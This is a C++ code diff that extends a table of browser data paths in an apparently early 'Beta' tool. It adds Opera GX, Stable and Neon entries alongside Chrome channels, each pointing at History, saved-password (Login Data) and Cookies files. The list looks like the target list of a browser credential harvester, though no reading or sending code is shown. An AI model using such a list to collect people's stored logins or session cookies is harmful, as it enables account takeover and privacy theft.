@@ -78,35 +78,48 @@ string status = "Beta";
 double version = 0.1;
 
 unordered_map<string, vector<string>> known_browser_paths = {
-    {"Chrome", {
-        R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\History)",
-        R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data)",
-        R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies)",
-        R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\History)",
-        R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\Login Data)",
-        R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\Network\Cookies)",
-        R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\History)",
-        R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\Login Data)",
-        R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\Network\Cookies)",
-        R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\History)",
-        R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\Login Data)",
-        R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\Network\Cookies)",
-        R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\History)",
-        R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\Login Data)",
-        R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\Network\Cookies)",
-        R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\History)",
-        R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\Login Data)",
-        R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\Network\Cookies)",
+    {
+        "Chrome", {
+            R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\History)",
+            R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data)",
+            R"(%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies)",
+            R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\History)",
+            R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\Login Data)",
+            R"(%LOCALAPPDATA%\Google\Chrome SxS\User Data\Default\Network\Cookies)",
+            R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\History)",
+            R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\Login Data)",
+            R"(%LOCALAPPDATA%\Google\Chrome Beta\User Data\Default\Network\Cookies)",
+            R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\History)",
+            R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\Login Data)",
+            R"(%LOCALAPPDATA%\Google\Chrome Dev\User Data\Default\Network\Cookies)",
+            R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\History)",
+            R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\Login Data)",
+            R"(%LOCALAPPDATA%\Google\Chrome Unstable\User Data\Default\Network\Cookies)",
+            R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\History)",
+            R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\Login Data)",
+            R"(%LOCALAPPDATA%\Google\Chrome Canary\User Data\Default\Network\Cookies)",
+        }
+    },
+    {
+        "Opera", {
+            R"(%APPDATA%\Opera Software\Opera GX Stable\History)",
+            R"(%APPDATA%\Opera Software\Opera GX Stable\Login Data)",
+            R"(%APPDATA%\Opera Software\Opera GX Stable\Network\Cookies)",
+            R"(%APPDATA%\Opera Software\Opera Stable\History)",
+            R"(%APPDATA%\Opera Software\Opera Stable\Login Data)",
+            R"(%APPDATA%\Opera Software\Opera Stable\Network\Cookies)",
+            R"(%APPDATA%\Opera Software\Opera Neon\User Data\Default\History)",
+            R"(%APPDATA%\Opera Software\Opera Neon\User Data\Default\Login Data)",
+            R"(%APPDATA%\Opera Software\Opera Neon\User Data\Default\Network\Cookies)",
     }},
 };
 
 enum Browsers {
     Chrome,
+    Opera,
     Edge,
     Brave,
-    OperaGX,
     Firefox,
-    Opera,
 };
 
 bool fileExists(const string& filePath) {
